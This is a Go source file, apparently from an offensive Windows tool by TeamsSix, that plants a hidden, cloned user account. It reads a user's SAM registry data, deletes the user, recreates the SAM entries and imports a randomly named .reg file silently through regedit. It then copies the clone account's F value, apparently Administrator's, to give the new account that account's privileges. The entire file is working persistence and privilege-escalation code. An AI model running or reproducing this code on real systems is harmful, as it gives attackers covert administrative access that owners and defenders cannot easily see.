// Author : TeamsSix
// Blog : teamssix.com
// WeChat Official Accounts: TeamsSix

package core

import (
	"../common"
	"fmt"
	registry "github.com/golang/sys/windows/registry"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

type UserRegistry struct {
	F                       []byte
	ForcePasswordReset      []byte
	SupplementalCredentials []byte
	V                       []byte
}

func EditRegistry(username, cloneuser string) {
	t := 0
	systemname, _ := ListLocalUsers()
	for _, i := range systemname {
		if i.Username == cloneuser {
			t++
		}
	}
	if t == 0 {
		fmt.Printf("[-] Not Found %s user", cloneuser)
		fmt.Println("[-] Failed to add hidden user.")
		os.Exit(3)
	}
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users\\Names\\" + cloneuser)
	// 1. Get User RID
	NamesUserNamePath := "SAM\\SAM\\Domains\\Account\\Users\\Names\\" + username
	NamesAdministratorPath := "SAM\\SAM\\Domains\\Account\\Users\\Names\\" + cloneuser

	_, UserNameIntRID := GetRegistryValue(NamesUserNamePath, "")
	_, AdministratorIntRID := GetRegistryValue(NamesAdministratorPath, "")

	UserNameRID := strconv.FormatUint(uint64(UserNameIntRID), 16)
	fmt.Printf("[+] %s RID: %v\n", username, strings.ToUpper(UserNameRID))
	UserNameHexRID := "00000" + UserNameRID
	if UserNameRID == string(0) {
		fmt.Println("Failed to get user RID value.")
		fmt.Printf("[-] Failed to Delete %s User\n", username)
		os.Exit(3)
	}

	AdministratorRID := strconv.FormatUint(uint64(AdministratorIntRID), 16)
	fmt.Printf("[+] %s RID: %v\n", cloneuser, strings.ToUpper(AdministratorRID))
	AdministratorHexRID := "00000" + AdministratorRID

	UsersUserNamePath := "SAM\\SAM\\Domains\\Account\\Users\\" + strings.ToUpper(UserNameHexRID)
	UsersAdministratorPath := "SAM\\SAM\\Domains\\Account\\Users\\" + strings.ToUpper(AdministratorHexRID)

	// 2. Get User Registry
	var UserRegistry UserRegistry
	UserRegistry.F, _ = GetRegistryValue(UsersUserNamePath, "F")
	UserRegistry.ForcePasswordReset, _ = GetRegistryValue(UsersUserNamePath, "ForcePasswordReset")
	UserRegistry.SupplementalCredentials, _ = GetRegistryValue(UsersUserNamePath, "SupplementalCredentials")
	UserRegistry.V, _ = GetRegistryValue(UsersUserNamePath, "V")

	// 3. Delete User
	ret := DeleteWindowsApiUser(username)
	if ret != NET_API_STATUS_NERR_Success {
		fmt.Printf("[-] Failed to Delete %s User\n", username)
	} else {
		fmt.Printf("[+] Succeeded to Delete %s User using Windows API.\n", username)
	}

	// 4. Create User Registry

	// Create SAM\SAM\Domains\Account\Users\00000XXX
	CreateNewRegistery(UsersUserNamePath)
	key, _ := registry.OpenKey(registry.LOCAL_MACHINE, UsersUserNamePath, registry.ALL_ACCESS)
	defer key.Close()
	key.SetBinaryValue("F", UserRegistry.F)
	key.SetBinaryValue("ForcePasswordReset", UserRegistry.ForcePasswordReset)
	key.SetBinaryValue("SupplementalCredentials", UserRegistry.SupplementalCredentials)
	key.SetBinaryValue("V", UserRegistry.V)

	// Create SAM\SAM\Domains\Account\Users\Names\username

	UserNameReg := "Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\" + username + "]\n@=hex(" + UserNameRID + "):"
	ioutil.WriteFile(".sTRmxJkRFoTFaPRXBeavZhjaAYNvpYko.reg", []byte(UserNameReg), 0644)
	cmd := exec.Command("regedit", "/s", ".sTRmxJkRFoTFaPRXBeavZhjaAYNvpYko.reg")
	err := cmd.Run()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	os.Remove(".sTRmxJkRFoTFaPRXBeavZhjaAYNvpYko.reg")

	fmt.Println("[+] Registry imported successfully.")

	// 5. Replace User Registry
	ReplaceRegistryValue(UsersAdministratorPath, UsersUserNamePath)

	// 6. Enable User
	EnableUser(username)

	k := 0
	HiddenAccounts := CheckHiddenAccountsSub()
	for _, i := range HiddenAccounts {
		if i == username {
			k++
		}
	}
	if k == 1 {
		fmt.Println("[+] Successfully add hidden user.")
	} else {
		fmt.Println("[-] Failed to add hidden user.")
	}

}

func GetRegistryValue(path, NamesType string) ([]byte, uint32) {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	if err != nil { // Registry Access is denied
		fmt.Printf("[-] Registry %s\n", err)
	}
	defer key.Close()

	value, rid, _ := key.GetBinaryValue(NamesType)
	return value, rid
}

func ReplaceRegistryValue(UsersAdministratorPath, UsersUserNamePath string) {
	common.DetermineRegistryPermissions(UsersAdministratorPath)
	AdministratorFVaule, _ := GetRegistryValue(UsersAdministratorPath, "F")

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, UsersUserNamePath, registry.ALL_ACCESS)
	if err != nil { // Registry Access is denied
		fmt.Printf("[-] Registry %s\n", err)
	}

	err = key.SetBinaryValue("F", AdministratorFVaule)
	if err != nil {
		fmt.Printf("[-] %s\n", err)
	} else {
		fmt.Println("[+] Registry replaced successfully.")
	}
}

func CreateNewRegistery(path string) {
	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	if err != nil {
		fmt.Printf("[-] Registry %s\n", err)
	}
	defer key.Close()
}
